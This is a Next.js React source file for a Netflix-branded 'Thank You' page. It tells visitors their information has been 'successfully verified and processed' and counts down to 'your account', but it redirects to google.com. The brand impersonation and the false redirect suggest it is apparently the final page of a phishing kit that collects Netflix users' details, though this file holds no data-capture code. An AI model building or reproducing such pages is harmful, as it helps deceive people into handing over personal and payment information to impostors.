"use client";

import { useEffect, useState } from "react";
import Image from "next/image";

export default function ThankYouPage() {
  const [countdown, setCountdown] = useState(5);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          window.location.href = "https://google.com";
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center relative"
      style={{
        backgroundImage: "url('/bg.jpg')",
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
      }}
    >
      {/* Dark overlay */}
      <div className="absolute inset-0 bg-black/60" />

      {/* Logo */}
      <div className="absolute top-6 left-6 z-10">
        <Image src="/logo.png" alt="Netflix" width={120} height={32} />
      </div>

      {/* Thank You Content */}
      <div className="relative z-10 text-center max-w-md mx-auto px-6">
        {/* Success Animation */}
        <div className="mb-8">
          <div className="w-24 h-24 mx-auto mb-6 rounded-full bg-green-500/20 flex items-center justify-center animate-pulse">
            <svg
              className="w-12 h-12 text-green-400"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={3}
                d="M5 13l4 4L19 7"
              />
            </svg>
          </div>
        </div>

        {/* Thank You Message */}
        <h1 className="text-4xl font-bold text-white mb-4">Thank You!</h1>

        <p className="text-white/80 text-lg mb-6 leading-relaxed">
          Your information has been successfully verified and processed.
        </p>

        <p className="text-white/60 text-sm mb-8">
          Welcome to Netflix! Get ready to enjoy unlimited movies and TV shows.
        </p>

        {/* Countdown */}
        <div className="bg-white/10 backdrop-blur-sm rounded-lg p-4 border border-white/20">
          <p className="text-white/80 text-sm mb-2">
            Redirecting to your account in:
          </p>
          <div className="text-3xl font-bold text-red-400">{countdown}</div>
        </div>

        {/* Manual Redirect Button */}
        <button
          onClick={() => (window.location.href = "https://google.com")}
          className="mt-6 px-8 py-3 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-lg transition-colors"
        >
          Continue Now
        </button>
      </div>

      {/* Footer */}
      <div className="absolute bottom-6 left-1/2 transform -translate-x-1/2 text-center">
        <p className="text-white/40 text-xs">
          🎉 Welcome to the Netflix family!
        </p>
      </div>
    </div>
  );
}


